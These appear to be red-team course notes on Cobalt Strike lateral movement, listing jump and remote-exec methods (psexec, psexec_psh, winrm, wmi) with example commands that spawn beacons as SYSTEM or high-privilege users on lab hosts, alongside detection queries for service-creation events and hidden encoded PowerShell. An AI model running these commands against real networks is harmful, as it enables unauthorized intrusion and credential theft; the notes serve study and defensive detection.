# Lateral Movement

Moving between hosts in a domain helps access sensitive information and obtain new credentials. Using Aggressor, custom methods can be used for **jump** and **remote-exec**. Each of these strategies are compatible with User Impersonation techniques (e.g. use pth to impersonate a user and then jump to move laterally). Some of Seatbelt's commands can also be run remotely (e.g. ```execute-assembly Seatbelt.exe OSInfo -ComputerName=web```).

### jump

```jump [method] [target] [listener]``` spawns a beacon payload on the remote target (and connect to it if using a P2P listener).

    Exploit                   Arch  Description
    -------                   ----  -----------
    psexec                    x86   Use a service to run a Service EXE artifact
    psexec64                  x64   Use a service to run a Service EXE artifact
    psexec_psh                x86   Use a service to run a PowerShell one-liner
    winrm                     x86   Run a PowerShell script via WinRM
    winrm64                   x64   Run a PowerShell script via WinRM

### remote-exec

```remote-exec [method] [target] [command]``` executes the command on the target (not exclusive to lateral movement). Needs more manual work to manage the payload, but does offer a wider degree of control. 

    Methods                         Description
    -------                         -----------
    psexec                          Remote execute via Service Control Manager
    winrm                           Remote execute via WinRM (PowerShell)
    wmi                             Remote execute via WMI

## Windows Remote Management

The **winrm / winrm64** methods return a high priv beacon running as the user interacting with the remote machine. SMB Beacon traffic blends in very well with expected traffic on Windows networks.

```jump winrm64 web.dev.cyberbotic.io smb``` - creates a Beacon that runs inside wsmprovhost.exe (the Host process for WinRM plug-ins), used whenever WinRM is used, legitimate or not. 

Admins can search for process start events, but get a lot of false positives. Best way to catch is to search PS script block logs for known payload artefacts, e.g. ```event.category: process and powershell.file.script_block_text: "$var_runme.Invoke([IntPtr]::Zero)"```

## PsExec

**psexec / psexec64** upload a service binary to the target, then create and starting a service to execute that binary. Beacons run as SYSTEM. 

```jump psexec64 web.dev.cyberbotic.io smb``` 

Catch by looking for 4697 service created events (which are rare, unless a service comes with other software). CS uses a random 7-char alphanumeric string for service name and binary filename. When setting the binPath for the service, it uses a UNC path to the ADMIN$ share: ```event.code: 4697 and winlog.event_data.ServiceFileName: \\\\*\\ADMIN$\\*.exe```

**psexec_psh** doesn't copy a binary to the target, but runs a PS 32-bit command. The pattern it uses by default is ```%COMSPEC% /b /c start /b /min powershell -nop -w hidden -encodedcommand ....```

```jump psexec_psh web smb```

## Windows Management Instrumentation (WMI)

WMI is part of remote-exec. 